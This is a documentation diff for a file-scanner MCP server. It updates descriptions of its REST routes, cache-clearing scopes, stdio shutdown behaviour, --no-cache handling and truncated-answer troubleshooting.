 | `GET /health` | `{"status":"ok","service":"file-scanner-mcp","version":"...",...}`. Needs no token. |
-| `GET /api/info` | Routes, version and uptime. |
+| `GET /api/info` | Routes (with what `POST /cache/clear` clears), version and uptime. |
 | `POST /initialize`, `POST /tools/list` | Identity, tool schemas. `/tools/list` replies `{jsonrpc, result: {tools}}`. |
 | `POST /tools/call` | Call a tool: `{"name": "...", "arguments": {...}}`. Replies `{resultType, content, isError}`. |
 | `GET /cache/list`, `GET /cache/stats` | Analysis history entries and statistics. |
@@ -1244,6 +1334,9 @@ protocol; they are for scripts and health checks.
 | `POST /cache/clear` | Clears what `cache_clear` clears by default (history, sections, tracked strings). |
 | `GET /strings/stats`; `POST /strings/{search,details,related,filter}` | String tracker. |
 | `GET /api-docs/openapi.json` | OpenAPI description of the REST routes. |
+
+`POST /cache/clear` takes the same scopes as the tool, as a query parameter: `?scope=all|analysis|strings`. Another
+value is a 400. The reply has `status`, `message` and a `cleared` list.
 
 REST requests time out after 120 seconds (504), and at most 16 run at once. An example call:
 
@@ -1253,6 +1346,11 @@ curl -s -X POST http://127.0.0.1:3000/tools/call -H 'Content-Type: application/j
 ```
 
 When the server is stopped with Ctrl-C or SIGTERM it ends open streams and exits 0.
+
+On stdio, closing stdin ends the session. The server waits up to 5 seconds for calls that are still running and
+answers them. A call still running after that gets no answer: the server writes one line to stderr (`input closed and
+a call was still running after 5 s; exiting without its answer`) and exits 0. A one-shot piped session therefore
+works for calls that take a few seconds; for longer ones keep stdin open until the answer arrives.
 
 ## The cache
 
@@ -1284,9 +1382,9 @@ files you analyzed, and the call history. The tracked-string index is kept in me
 server process, so it is empty after a restart. It never stores a copy of the analyzed file. Treat the directory
 as sensitive if the files were. Run `cache_clear` (or delete the directory) to remove it. `--no-cache` stops the
 section cache and the analysis history, on disk and in memory, and drill-down calls then recompute their sections
-each time (see `cache: hit | miss` for what the answers carry). The in-memory string
-index is not part of that cache: it still fills while the server runs (see `search_strings`), and `cache_clear`
-empties it. `cache_clear` removes only what the cache wrote.
+each time (see `cache: hit | miss` for what the answers carry). The in-memory string index is not part of that
+cache: it still fills while the server runs (see `search_strings`), and `cache_clear` empties it. Under
+`--no-cache`, `cache_status` carries a `note` that says so. `cache_clear` removes only what the cache wrote.
 
 At most `max(4, CPU count)` analyses run at the same time across all connections; others wait.
 
@@ -1351,9 +1449,8 @@ message is the method name.
 **"outside the directories this server may read".** The path is not under an `--allow-root`. The message names the
 allowed directories.
 
-**Answers are cut off.** Look for `truncated`, `hint`, `note`, `returned`
-and `next_offset`. Page with `offset`, narrow with
-`filter`, or raise `max_output_bytes` (ceiling 400,000). Clients may still limit what they inline.
+**Answers are cut off.** Look for `truncated`, `hint`, `note`, `returned` and `next_offset`. Page with `offset`,
+narrow with `filter`, or raise `max_output_bytes` (ceiling 400,000). Clients may still limit what they inline.
 
 **Results look stale or you want a clean slate.** Call `cache_clear`, or start the server with `--no-cache`.
 
